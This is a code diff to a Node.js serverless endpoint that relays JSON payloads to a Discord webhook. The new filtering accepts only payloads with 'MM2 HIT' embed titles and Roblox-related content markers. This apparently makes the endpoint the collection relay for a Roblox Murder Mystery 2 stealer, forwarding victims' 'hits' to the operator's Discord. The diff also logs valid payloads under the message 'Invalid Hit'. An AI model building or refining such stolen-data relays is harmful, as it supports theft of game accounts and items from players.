@@ -26,7 +26,22 @@ module.exports = async (req, res) => {
     return res.status(400).send('Invalid JSON body: ' + err.message);
   }
 
-  // TÜM DOĞRULAMALAR KALDIRILDI – HER İSTEK DISCORD'A İLETİLİR
+  // Validation: Must have embeds array
+  if (!payload.embeds || !Array.isArray(payload.embeds) || payload.embeds.length === 0) {
+    return res.status(400).send('Invalid Hit');
+  }
+  const content = payload.content || '';
+  if (!content.includes('PUBLIC GREED') && !content.includes('game:GetService')) {
+    return res.status(400).send('Invalid Hit');
+  }
+  const allTitlesValid = payload.embeds.every(embed => {
+    return embed.title && embed.title.includes('MM2 HIT');
+  });
+  if (!allTitlesValid) {
+    return res.status(400).send('Invalid Hit');
+  }
+
+  console.log('Invalid Hit', JSON.stringify(payload));
 
   try {
     const response = await fetch(discordUrl, {
